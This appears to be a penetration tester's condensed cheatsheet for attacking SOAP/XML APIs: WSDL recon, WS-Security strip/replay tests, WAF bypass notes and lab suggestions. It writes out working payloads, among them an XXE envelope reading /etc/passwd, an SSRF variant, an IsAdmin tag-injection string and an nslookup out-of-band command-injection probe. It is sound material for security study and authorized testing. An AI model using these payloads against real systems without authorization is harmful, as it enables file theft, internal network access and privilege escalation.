# SOAP/XML API Security — Final Cheatsheet

Condensed quick-reference. Full mechanism, worked examples, and WAF/Gateway detail live in files 1–5 — this file is for fast recall during an active engagement, not first-time learning.

---

## 1. Recon Checklist

- [ ] Discover WSDL: `?wsdl` on suspected endpoints, `.asmx?wsdl`, `.svc?wsdl`, `/services/`, `/soap/`, `/ws/`, robots.txt, JS/mobile source, Shodan `filetype:wsdl`
- [ ] Identify SOAP version: namespace `http://schemas.xmlsoap.org/soap/envelope/` = 1.1 (`SOAPAction` header, `text/xml`); `http://www.w3.org/2003/05/soap-envelope` = 1.2 (`action` param in `Content-Type: application/soap+xml`, no separate SOAPAction header)
- [ ] Fingerprint stack: `.asmx`/`.svc` = .NET, `/axis2/services/` = Apache Axis2, `/ws/`+`/services/` = Java/Spring-WS/CXF
- [ ] Pull full `<types>` schema for every operation — not just UI-exposed ones
- [ ] Enumerate every `<operation>` under `<portType>`/`<interface>` — flag anything absent from the client UI as priority target
- [ ] Extract real endpoint from `<service><port><soap:address location>` — check for internal hostname leakage
- [ ] Note SOAPAction value per operation from `<binding>`
- [ ] Follow all `<xsd:import>`/`<wsdl:import>` references — WSDLs are often split across files
- [ ] Check WS-Policy (`<wsp:Policy>`) declarations for claimed-mandatory WS-Security elements
- [ ] Import into SoapUI (WS-Security testing) and/or convert via wsdl2postman (Postman-unified workflow)

---

## 2. Envelope Structure Quick Reference

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Header>   <!-- auth, WS-Security, routing metadata --></soapenv:Header>
   <soapenv:Body>     <!-- operation call + params — primary injection surface --></soapenv:Body>
</soapenv:Envelope>
```
Faults: `<soapenv:Fault><faultcode/><faultstring/><detail/></soapenv:Fault>` — `faultstring`/`detail` are your primary error-based testing oracle.

---

## 3. XXE via SOAP

```xml
<?xml version="1.0"?>
<!DOCTYPE soapenv:Envelope [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body><web:Op><web:Param>&xxe;</web:Param></web:Op></soapenv:Body>
</soapenv:Envelope>
```
- DOCTYPE root name must match actual root element (`soapenv:Envelope`)
- Target reflected/logged/fault-surfaced parameters first
- Prioritize `xsd:string` fields over strictly-typed `xsd:int`/`xsd:dateTime`
- No in-band reflection → OOB via external DTD/Collaborator (full technique: XXE web app series)
- **SSRF pivot is usually higher-impact than file read** — SOAP backends sit deep in internal networks: `SYSTEM "http://internal-host:port/"`
- Full entity theory, blind/OOB technique, XXE→RCE chains: **see XXE web app note series** (not repeated here)

## 4. SOAP Injection (Structural Tag Injection)

Pattern: close the current element early, inject a new sibling, reopen to stay well-formed.
```
legituser</web:Username><web:IsAdmin>true</web:IsAdmin><web:Username>legituser
```
- Confirm breakout first: single `<` → raw parse error = concatenation, not escaped binding
- Target undocumented sibling fields visible only in the WSDL `<types>` schema, never in the UI
- Best targets: SOAP-to-SOAP proxy/orchestration hops (weaker validation than the external-facing layer)

## 5. WS-Security Testing

- **Strip test**: remove `<wsse:Security>` entirely, resend → succeeds = server doesn't enforce it
- **Partial strip**: remove Timestamp only / UsernameToken only → isolates which sub-element is actually checked
- **Tamper-after-sign**: modify Body post-signing, leave `<ds:Signature>` untouched → succeeds = signature not actually validated
- **Replay**: resend identical valid request before `Expires` → succeeds twice = no nonce tracking
- **Post-expiry replay**: resend after `Expires` → succeeds = timestamp enforcement broken entirely
- `PasswordText` type without independently enforced TLS = reportable finding regardless of other controls

## 6. SQLi / Command Injection via SOAP Params

- Root cause and exploitation identical to REST — XML wrapping is irrelevant once deserialized
- **Escaping requirement is the #1 practical gotcha**: `&` → `&amp;` mandatory (breaks XML if raw); `<`/`>` → `&lt;`/`&gt;`; `'` usually safe raw but use `&apos;` if a proxy/library mangles it
- SQLi oracle: single `'` → SQL syntax error surfaced in `faultstring`/`detail`
- CMDi targets: operations named `Ping*`, `*Route`, `Convert*`, `*Report`, `*Diagnostic` — legacy shell-out wrappers
- Blind CMDi: OOB via `; nslookup {collaborator}` (encode `&&` as `&amp;&amp;` if that's your separator)
- Test hidden/non-UI operations first — weakest validation historically

---

## 7. WAF / API Gateway Bypass Quick Reference

| Attack | Detection likelihood | Realistic bypass angle |
|---|---|---|
| XXE | High — dedicated XML gateways parse DTDs directly | Parameter-entity obfuscation, encoding tricks (UTF-7/16 vs older gateways), external DTD content hosted off-request |
| SOAP injection | Low-moderate — looks like normal well-formed XML | Strict schema validation (rejecting unknown elements) is the real control, not WAF signatures — test whether schema is permissive (`xsd:any`) |
| WS-Security bypass/replay | N/A — not a signature-detection problem | This is a server logic/config gap, not something to "bypass"; gateway may itself be the enforcement point under test |
| SQLi/CMDi via SOAP | High — dedicated gateways bundle generic injection rulesets on decoded element text | Standard SQLi/CMDi keyword-evasion techniques transfer directly (this layer inspects decoded values, so XML-escaping is not an evasion technique); check per-operation rule inconsistency; consider second-order/async injection paths |

---

## 8. PortSwigger Lab Progression (Honest Gap Summary)

No SOAP-native labs exist on PortSwigger as of this writing. Technique-building labs to use instead, in order:

1. **Apprentice** — XXE: *Exploiting XXE to retrieve files*
2. **Apprentice** — XXE: *Exploiting XXE to perform SSRF*
3. **Apprentice/Practitioner** — Authentication: broken logic labs (mental model for "enforced vs assumed" — transfers to WS-Security testing)
4. **Practitioner** — XXE: *Blind XXE with OOB interaction*
5. **Practitioner** — XXE: *Blind XXE with OOB interaction via parameter entities*
6. **Practitioner** — XXE: *Exfiltrate data via malicious external DTD*
7. **Expert** — XXE: *Exploiting XInclude to retrieve files*
8. **Expert** — XXE: *Exploiting XXE via image file upload* (relevant if target supports MTOM/SwA attachments)
9. SQLi and OS Command Injection full Apprentice→Expert tracks from your web app series — apply SOAP delivery/encoding rules from this cheatsheet's section 6 when translating

**Supplementary practice**: SoapUI bundled sample services (syntax/tooling practice only, not vulnerable targets); TryHackMe general XML/SOAP-adjacent rooms (partial transfer, no dedicated SOAP-injection room exists); crAPI is **not applicable** (REST-only).

---

## 9. Tooling One-Liners

**SoapUI**: File → New SOAP Project → paste WSDL URL → auto-generates one request per operation → proxy through Burp (`127.0.0.1:8080`, import Burp CA cert) → Repeater for payload iteration. Use for anything requiring WS-Security (Outgoing WSS tab: Username Token, Timestamp, Signature/Encryption config, strip-to-test).

**wsdl2postman**: `wsdl2postman -f target.wsdl -o target_collection.json` → import into Postman → proxy through Burp identically. Use for WS-Security-free surfaces or when unifying with an existing REST Postman workflow. No native WS-Security UI — hand-build or fall back to SoapUI when signing/encryption is required.

---

## 10. File Index

1. `01-soap-wsdl-fundamentals.md` — envelope/WSDL mechanism
2. `02-xxe-via-soap.md` — SOAP-specific XXE delivery
3. `03-soap-injection-ws-security.md` — tag injection + WS-Security
4. `04-wsdl-enumeration-injection-methodology.md` — enumeration + SQLi/CMDi
5. `05-tooling-soapui-wsdl2postman.md` — full tool breakdowns
6. `06-cheatsheet.md` — this file
